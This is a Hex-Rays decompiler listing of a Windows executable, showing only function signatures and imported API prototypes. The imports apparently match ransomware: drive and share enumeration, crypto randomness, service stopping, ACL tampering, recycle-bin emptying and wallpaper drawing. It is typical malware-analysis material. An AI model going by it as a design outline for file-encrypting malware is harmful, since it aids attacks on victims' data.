/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

void *__thiscall sub_401000(void *this);
char *__thiscall sub_401010(char *this, int a2);
char __thiscall sub_401020(_BYTE *this, char a2);
int __fastcall sub_401030(unsigned __int16 *a1, int a2);
// void __usercall sub_4010AD(int a1@<eax>, char a2);
int __stdcall sub_4010E0(unsigned __int64 a1, __int64 a2);
unsigned __int64 __stdcall sub_4011D0(unsigned __int64 a1, __int64 a2);
unsigned int __stdcall sub_4012C0(unsigned __int64 a1, __int64 a2);
int __cdecl sub_401330(_DWORD *a1);
int __cdecl sub_4013F0(_DWORD *a1, char a2, char *a3, unsigned int Src);
void *__cdecl sub_4014A0(_DWORD *a1);
int __cdecl sub_4014E0(_DWORD *a1, void *a2, size_t Size);
int __cdecl sub_401610(_DWORD *a1);
int __cdecl sub_401680(_OWORD *a1, void *Src, size_t Size);
int __cdecl sub_401870(int a1, int a2);
void *__cdecl sub_401940(char *a1);
void *__cdecl sub_401970(void *a1);
int __cdecl sub_401990(int a1, char *a2, unsigned int a3);
int __cdecl sub_401A80(int a1, void *Src, size_t Size); // idb
int __cdecl sub_401B70(_DWORD *a1, int a2, int a3, void *Src, size_t Size);
int __cdecl sub_401BE0(int *a1, int a2, int a3, __m128i *a4, __m128i *a5, unsigned __int8 *a6);
int __cdecl sub_401CB0(int *a1, int a2, unsigned __int8 *a3, int a4);
void *__cdecl sub_401CE0(void *a1);
void *__cdecl sub_401D00(void *a1);
int __cdecl sub_401D20(_DWORD *a1, unsigned __int8 *a2, int a3);
int __cdecl sub_402220(int *a1, unsigned __int8 *a2, int a3);
int __cdecl sub_4027B0(int *a1, unsigned __int8 *a2, int a3);
int __cdecl sub_402D40(int a1, int a2, int a3);
int __cdecl sub_402F10(_DWORD *a1, int *a2, int a3);
int __cdecl sub_402F50(_DWORD *a1, int *a2, _DWORD *a3);
unsigned int __cdecl sub_402FC0(int a1);
unsigned int __cdecl sub_403020(int a1, int a2);
int __cdecl sub_4030C0(int *a1, int a2);
int __cdecl sub_403100(int *a1, int *a2);
int __cdecl sub_4031E0(int a1, int a2);
int __cdecl sub_4032C0(_DWORD *a1, int *a2, int *a3, int *a4);
int __cdecl sub_403860(_DWORD *a1, int *a2, int a3, int a4, int a5);
int __cdecl sub_403F50(int a1, unsigned int a2, void (__cdecl *a3)(int, unsigned int, unsigned int), int a4);
void __cdecl sub_404050(int a1);
int __cdecl sub_4040A0(int a1, int a2, int a3);
int __cdecl sub_404310(int a1, unsigned int a2, char a3, void (__cdecl *a4)(int, unsigned int, unsigned int), int a5);
int __cdecl sub_4046C0(int a1, unsigned int a2);
int __cdecl sub_4046F0(int a1, size_t Count); // idb
_DWORD *__cdecl sub_404760(_DWORD *a1);
int __cdecl sub_404780(int a1, int *a2, int *a3);
int __cdecl sub_404D30(int a1, unsigned int a2, void (__cdecl *a3)(int, unsigned int, unsigned int), int a4);
int __cdecl sub_404E20(int a1);
int __cdecl sub_404E70(int a1, int a2);
int __cdecl sub_404F10(_DWORD *a1, int a2, int a3);
int __cdecl sub_404FB0(int *a1, int *a2, int *a3);
int __cdecl sub_405150(int *a1, int *a2, int a3);
int __cdecl sub_405190(int *a1, int *a2, int *a3);
int __cdecl sub_405360(int a1, void *Src, size_t Size); // idb
int __cdecl sub_405470(int a1, unsigned int a2);
int __cdecl sub_4055B0(int a1, unsigned int a2);
unsigned int __cdecl sub_4056A0(int a1);
int __cdecl sub_4056C0(int a1, int a2, int a3);
int __cdecl sub_405790(_DWORD *a1, int *a2, int a3);
int __cdecl sub_4057D0(_DWORD *a1, int *a2, _DWORD *a3);
int __cdecl sub_405840(__int64 *a1, __int64 *a2);
int __cdecl sub_405870(int a1, char *a2, unsigned int a3);
void __cdecl sub_405920(unsigned int *a1, int a2);
int __cdecl sub_4059C0(unsigned int a1);
int __cdecl sub_405A60(int *a1, unsigned int a2, void (__cdecl *a3)(int, unsigned int, unsigned int), int a4);
int __cdecl sub_405EF0(int a1, int a2, int a3, int a4, int a5);
int __cdecl sub_406010(int a1, int a2, int a3, int a4);
unsigned int __cdecl sub_406050(unsigned int a1, unsigned int *a2, unsigned int *a3, unsigned int a4);
unsigned int __cdecl sub_4062C0(int a1, int a2, unsigned int *a3);
int __cdecl sub_406330(int *a1);
int __cdecl sub_4063B0(int a1);
int __cdecl sub_406450(int *a1, int a2, int a3, int a4, int a5, int a6);
int __cdecl sub_406550(int *a1, int a2, int a3, int a4);
void __cdecl sub_406620(int a1);
int __cdecl sub_4066C0(int *a1, void (__cdecl *a2)(int, unsigned int, unsigned int), int a3, unsigned int a4, int a5);
int __cdecl sub_4069A0(int a1, int a2, int a3, int a4, int a5, int a6);
int __cdecl sub_406A50(void *a1, int a2, int a3); // idb
int __cdecl sub_406A80(int *a1, void (__cdecl *a2)(int, unsigned int, unsigned int), int a3, int a4, size_t Size, void *Src, char *a7);
int __cdecl sub_406B70(int *a1, void (__cdecl *a2)(int, unsigned int, unsigned int), int a3, void *Src, char *a5);
int __cdecl sub_4070A0(int a1, void *Src, char *a3);
int __cdecl sub_4071B0(int *a1, int a2);
int __cdecl sub_4072B0(_DWORD *a1, int a2);
int __cdecl sub_407C00(int a1, _BYTE *a2);
void *__cdecl sub_407DC0(void *a1);
void *__cdecl sub_407DE0(void *a1);
int __cdecl sub_407E00(char *Src, int a2, _BYTE *a3, int a4);
int __cdecl sub_407E70(_DWORD *a1, int a2);
int __cdecl sub_407F40(size_t *a1, char *Src, int a3);
int __cdecl sub_407FF0(int a1, BYTE *pbBuffer, DWORD dwLen, _DWORD *a4);
void *__cdecl sub_408020(void *a1, size_t Size);
int __cdecl sub_408040(int *a1, int *a2, int *a3, int *a4, int *a5, int a6);
int __cdecl sub_4080F0(int *a1, int *a2, _DWORD *a3, int *a4, int *a5, int *a6);
int __cdecl sub_4082A0(int *a1, int *a2, int *a3, int *a4, int *a5, void (__cdecl *a6)(int, unsigned int, unsigned int), int a7);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// void *__cdecl memset(void *, int Val, size_t Size);
// void __cdecl free(void *Block);
// void *__cdecl calloc(size_t Count, size_t Size);
void __fastcall sub_408600(int _ECX, __m128i *a2);
void __stdcall __noreturn sub_4088C0(PVOID Parameter);
BOOL __stdcall sub_408940(int a1, int a2);
ULONG __stdcall sub_408A60(PVOID Parameter); // idb
BOOL sub_408B20();
BOOL __thiscall sub_408C30(struct _NETRESOURCEW *this);
void __stdcall __noreturn StartAddress(_WORD *Parameter);
void sub_408EE0();
void __stdcall __noreturn sub_4090E0(_WORD *Parameter);
HANDLE __thiscall sub_4092E0(__int16 *this);
int sub_409A20();
int __fastcall sub_409AE0(int a1, int a2);
int __fastcall sub_40A1F0(_BYTE *a1);
int __fastcall sub_40A200(_WORD *a1);
BOOL sub_40A220();
unsigned int __thiscall sub_40A2F0(_DWORD *this);
BOOL __thiscall sub_40A410(LPCWSTR lpFileName);
int sub_40A4D0();
BOOL __stdcall sub_40A5A0(BYTE *pbBuffer, DWORD dwLen);
ULONG __stdcall sub_40A8B0(PVOID Parameter); // idb
HANDLE __thiscall sub_40F270(void *this);
int __fastcall sub_40F310(SC_HANDLE hService, SC_HANDLE a2);
int sub_40F4C0();
int __thiscall sub_40F570(void *this);
BOOL sub_40F750();
int sub_40F8C0();
void __noreturn start();
ULONG __stdcall sub_40FEF0(PVOID Parameter); // idb
BOOL __stdcall HandlerRoutine(DWORD CtrlType); // idb
DWORD sub_4100C0(LPCSTR a1, ...);
void __fastcall sub_410260(const WCHAR *arglist);
ULONG __stdcall sub_410510(PVOID Parameter); // idb
int __thiscall sub_410610(void *this);
int __thiscall sub_410CE0(const void *this);
void __stdcall __noreturn sub_410E30(PVOID Parameter);
int sub_411790();
int __fastcall sub_4120A0(char *Src, int *a2);
BOOL __thiscall sub_412270(char **this);
int sub_412730();
LPCWSTR __thiscall sub_412A40(LPCWSTR pszPath);
void __stdcall __noreturn sub_413140(PVOID Parameter);
int __thiscall sub_413240(WCHAR *this);
void sub_413590();
char __fastcall sub_413790(char *cp, u_short hostshort);
ULONG __stdcall sub_4138A0(PVOID Parameter); // idb
HRESULT __fastcall sub_4139B0(WCHAR *lpString2, IID *riid, int a3, void **a4);
void __stdcall EnumProc(PLDR_DATA_TABLE_ENTRY ModuleInformation, PVOID Parameter, BOOLEAN *Stop);
BOOL __thiscall sub_413B70(void *this);
NTSTATUS sub_413F30();
// int __stdcall GdipDrawString(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipCreateStringFormat(_DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipDeleteFontFamily(_DWORD); weak
// int __stdcall GdipGetImageEncoders(_DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipCreateFontFamilyFromName(_DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipDeleteBrush(_DWORD); weak
// int __stdcall GdipDisposeImage(_DWORD); weak
// int __stdcall GdipCreateFont(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipCreateSolidFill(_DWORD, _DWORD); weak
// int __stdcall GdipFillRectangle(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipGetGenericFontFamilySansSerif(_DWORD); weak
// int __stdcall GdiplusStartup(_DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipGetImageGraphicsContext(_DWORD, _DWORD); weak
// int __stdcall GdipGetImageEncodersSize(_DWORD, _DWORD); weak
// int __stdcall GdipDeleteGraphics(_DWORD); weak
// int __stdcall GdipDeleteStringFormat(_DWORD); weak
// int __stdcall GdipDeleteFont(_DWORD); weak
// int __stdcall GdipCreateBitmapFromScan0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall GdipSaveImageToFile(_DWORD, _DWORD, _DWORD, _DWORD); weak

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_41002D; // weak
_UNKNOWN loc_410039; // weak
// extern LSTATUS (__stdcall *RegCreateKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// extern BOOL (__stdcall *DuplicateToken)(HANDLE ExistingTokenHandle, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, PHANDLE DuplicateTokenHandle);
// extern BOOL (__stdcall *SetThreadToken)(PHANDLE Thread, HANDLE Token);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegOpenKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern BOOL (__stdcall *GetAclInformation)(PACL pAcl, LPVOID pAclInformation, DWORD nAclInformationLength, ACL_INFORMATION_CLASS dwAclInformationClass);
// extern BOOL (__stdcall *GetAce)(PACL pAcl, DWORD dwAceIndex, LPVOID *pAce);
// extern BOOL (__stdcall *AllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid);
// extern BOOL (__stdcall *AddAce)(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// extern BOOL (__stdcall *AddAccessDeniedAce)(PACL pAcl, DWORD dwAceRevision, DWORD AccessMask, PSID pSid);
// extern PVOID (__stdcall *FreeSid)(PSID pSid);
// extern BOOL (__stdcall *InitializeAcl)(PACL pAcl, DWORD nAclLength, DWORD dwAclRevision);
// extern DWORD (__stdcall *SetSecurityInfo)(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// extern DWORD (__stdcall *GetLengthSid)(PSID pSid);
// extern DWORD (__stdcall *GetSecurityInfo)(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID *ppsidOwner, PSID *ppsidGroup, PACL *ppDacl, PACL *ppSacl, PSECURITY_DESCRIPTOR *ppSecurityDescriptor);
// extern BOOL (__stdcall *EnumDependentServicesA)(SC_HANDLE hService, DWORD dwServiceState, LPENUM_SERVICE_STATUSA lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *InitializeSecurityDescriptor)(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern LSTATUS (__stdcall *RegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegDeleteValueW)(HKEY hKey, LPCWSTR lpValueName);
// extern BOOL (__stdcall *QueryServiceStatusEx)(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
// extern LSTATUS (__stdcall *RegQueryValueExW)(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// extern BOOL (__stdcall *SetFileSecurityW)(LPCWSTR lpFileName, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR pSecurityDescriptor);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *SetSecurityDescriptorOwner)(PSECURITY_DESCRIPTOR pSecurityDescriptor, PSID pOwner, BOOL bOwnerDefaulted);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern BOOL (__stdcall *LookupPrivilegeValueA)(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
// extern BOOL (__stdcall *CreateWellKnownSid)(WELL_KNOWN_SID_TYPE WellKnownSidType, PSID DomainSid, PSID pSid, DWORD *cbSid);
// extern BOOL (__stdcall *CheckTokenMembership)(HANDLE TokenHandle, PSID SidToCheck, PBOOL IsMember);
// extern BOOL (__stdcall *CryptBinaryToStringA)(const BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPSTR pszString, DWORD *pcchString);
// extern ULONG (__stdcall *GetAdaptersInfo)(PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer);
// extern DWORD (__stdcall *QueryDosDeviceW)(LPCWSTR lpDeviceName, LPWSTR lpTargetPath, DWORD ucchMax);
// extern HANDLE (__stdcall *FindFirstVolumeW)(LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern UINT (__stdcall *GetWindowsDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern PSLIST_ENTRY (__stdcall *InterlockedPopEntrySList)(PSLIST_HEADER ListHead);
// extern BOOL (__stdcall *AllocConsole)();
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern PSLIST_ENTRY (__stdcall *InterlockedPushEntrySList)(PSLIST_HEADER ListHead, PSLIST_ENTRY ListEntry);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern PSLIST_ENTRY (__stdcall *InterlockedFlushSList)(PSLIST_HEADER ListHead);
// extern BOOL (__stdcall *MoveFileW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);
// extern HANDLE (__stdcall *CreateIoCompletionPort)(HANDLE FileHandle, HANDLE ExistingCompletionPort, ULONG_PTR CompletionKey, DWORD NumberOfConcurrentThreads);
// extern BOOL (__stdcall *SystemTimeToFileTime)(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
// extern BOOL (__stdcall *GetQueuedCompletionStatus)(HANDLE CompletionPort, LPDWORD lpNumberOfBytesTransferred, PULONG_PTR lpCompletionKey, LPOVERLAPPED *lpOverlapped, DWORD dwMilliseconds);
// extern BOOL (__stdcall *SetFileTime)(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern DWORD_PTR (__stdcall *SetThreadAffinityMask)(HANDLE hThread, DWORD_PTR dwThreadAffinityMask);
// extern BOOL (__stdcall *FindNextVolumeW)(HANDLE hFindVolume, LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern BOOL (__stdcall *GetVolumePathNamesForVolumeNameW)(LPCWSTR lpszVolumeName, LPWCH lpszVolumePathNames, DWORD cchBufferLength, PDWORD lpcchReturnLength);
// extern BOOL (__stdcall *FindVolumeClose)(HANDLE hFindVolume);
// extern BOOL (__stdcall *SetVolumeMountPointW)(LPCWSTR lpszVolumeMountPoint, LPCWSTR lpszVolumeName);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern HANDLE (__stdcall *FindFirstFileExW)(LPCWSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern void (__stdcall __noreturn *ExitThread)(DWORD dwExitCode);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern BOOL (__stdcall *GetDiskFreeSpaceExW)(LPCWSTR lpDirectoryName, PULARGE_INTEGER lpFreeBytesAvailableToCaller, PULARGE_INTEGER lpTotalNumberOfBytes, PULARGE_INTEGER lpTotalNumberOfFreeBytes);
// extern HGLOBAL (__stdcall *GlobalAlloc)(UINT uFlags, SIZE_T dwBytes);
// extern BOOL (__stdcall *Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern HGLOBAL (__stdcall *GlobalFree)(HGLOBAL hMem);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HWND (__stdcall *GetConsoleWindow)();
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern DWORD (__stdcall *GetTempPathW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern UINT (__stdcall *GetTempFileNameW)(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern HANDLE (__stdcall *OpenMutexA)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern DWORD (__stdcall *GetTickCount)();
// extern void (__stdcall *GetSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
// extern void (__stdcall *GetLocalTime)(LPSYSTEMTIME lpSystemTime);
// extern BOOL (__stdcall *Process32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern LANGID (__stdcall *GetUserDefaultLangID)();
// extern BOOL (__stdcall *GetConsoleMode)(HANDLE hConsoleHandle, LPDWORD lpMode);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *Process32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern BOOL (__stdcall *SetConsoleCtrlHandler)(PHANDLER_ROUTINE HandlerRoutine, BOOL Add);
// extern BOOL (__stdcall *SetConsoleTextAttribute)(HANDLE hConsoleOutput, WORD wAttributes);
// extern BOOL (__stdcall *SetConsoleTitleA)(LPCSTR lpConsoleTitle);
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern BOOL (__stdcall *WriteConsoleA)(HANDLE hConsoleOutput, const void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved);
// extern BOOL (__stdcall *SetConsoleMode)(HANDLE hConsoleHandle, DWORD dwMode);
// extern BOOL (__stdcall *SetProcessShutdownParameters)(DWORD dwLevel, DWORD dwFlags);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *WNetAddConnection2W)(LPNETRESOURCEW lpNetResource, LPCWSTR lpPassword, LPCWSTR lpUserName, DWORD dwFlags);
// extern DWORD (__stdcall *WNetOpenEnumW)(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
// extern DWORD (__stdcall *WNetEnumResourceW)(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// extern DWORD (__stdcall *WNetGetConnectionW)(LPCWSTR lpLocalName, LPWSTR lpRemoteName, LPDWORD lpnLength);
// extern DWORD (__stdcall *WNetCloseEnum)(HANDLE hEnum);
// extern DWORD (__stdcall *NetShareEnum)(LPWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, LPDWORD resume_handle);
// extern DWORD (__stdcall *NetApiBufferFree)(LPVOID Buffer);
// extern HRESULT (__stdcall *SHEmptyRecycleBinW)(HWND hwnd, LPCWSTR pszRootPath, DWORD dwFlags);
// extern BOOL (__stdcall *ShellExecuteExA)(SHELLEXECUTEINFOA *pExecInfo);
// extern BOOL (__stdcall *ShellExecuteExW)(SHELLEXECUTEINFOW *pExecInfo);
// extern LPWSTR *(__stdcall *CommandLineToArgvW)(LPCWSTR lpCmdLine, int *pNumArgs);
// extern void (__stdcall *PathRemoveExtensionA)(LPSTR pszPath);
// extern LPWSTR (__stdcall *PathRemoveBackslashW)(LPWSTR pszPath);
// extern LPWSTR (__stdcall *PathAddBackslashW)(LPWSTR pszPath);
// extern PSTR (__stdcall *StrFormatByteSize64A)(LONGLONG qdw, PSTR pszBuf, UINT cchBuf);
// extern BOOL (__stdcall *PathRemoveFileSpecW)(LPWSTR pszPath);
// extern LPWSTR (__stdcall *PathFindExtensionW)(LPCWSTR pszPath);
// extern BOOL (__stdcall *PeekMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
// extern LONG (__stdcall *GetWindowLongA)(HWND hWnd, int nIndex);
// extern int (__stdcall *wvsprintfA)(LPSTR, LPCSTR, va_list arglist);
// extern LONG (__stdcall *SetWindowLongA)(HWND hWnd, int nIndex, LONG dwNewLong);
// extern BOOL (__stdcall *ShowWindow)(HWND hWnd, int nCmdShow);
// extern BOOL (__stdcall *GetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// extern DWORD (__stdcall *CharLowerBuffW)(LPWSTR lpsz, DWORD cchLength);
// extern LPSTR (__stdcall *CharUpperA)(LPSTR lpsz);
// extern BOOL (__stdcall *DeleteMenu)(HMENU hMenu, UINT uPosition, UINT uFlags);
// extern int (*wsprintfW)(LPWSTR, LPCWSTR, ...);
// extern BOOL (__stdcall *FlashWindow)(HWND hWnd, BOOL bInvert);
// extern int (*wsprintfA)(LPSTR, LPCSTR, ...);
// extern BOOL (__stdcall *IsWindowVisible)(HWND hWnd);
// extern BOOL (__stdcall *SystemParametersInfoW)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// extern int (__stdcall *GetSystemMetrics)(int nIndex);
// extern BOOL (__stdcall *EnableMenuItem)(HMENU hMenu, UINT uIDEnableItem, UINT uEnable);
// extern BOOL (__stdcall *SetLayeredWindowAttributes)(HWND hwnd, COLORREF crKey, BYTE bAlpha, DWORD dwFlags);
// extern BOOL (__stdcall *RegisterHotKey)(HWND hWnd, int id, UINT fsModifiers, UINT vk);
// extern BOOL (__stdcall *ShutdownBlockReasonCreate)(HWND hWnd, LPCWSTR pwszReason);
// extern HMENU (__stdcall *GetSystemMenu)(HWND hWnd, BOOL bRevert);
// extern u_short (__stdcall *htons)(u_short hostshort);
// extern int (__stdcall *ioctlsocket)(SOCKET s, int cmd, u_long *argp);
// extern int (__stdcall *WSAGetLastError)();
